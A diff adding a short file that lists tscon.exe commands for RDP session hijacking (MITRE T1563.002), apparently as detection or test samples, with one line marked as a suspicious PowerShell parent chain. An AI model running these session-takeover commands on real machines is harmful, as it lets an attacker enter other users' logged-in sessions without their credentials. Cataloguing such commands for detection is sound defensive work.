@@ -1,0 +1,13 @@
+# RDP Session Hijacking via tscon.exe (T1563.002)
+
+# Switch console to session 1
+tscon 1 /dest:console
+
+# Switch to another RDP session
+tscon 2 /dest:3
+
+# Switch using RDP channel format
+tscon 2 /dest:rdp-tcp#2
+
+# Suspicious parent chain:
+powershell.exe -c "tscon 1 /dest:2"
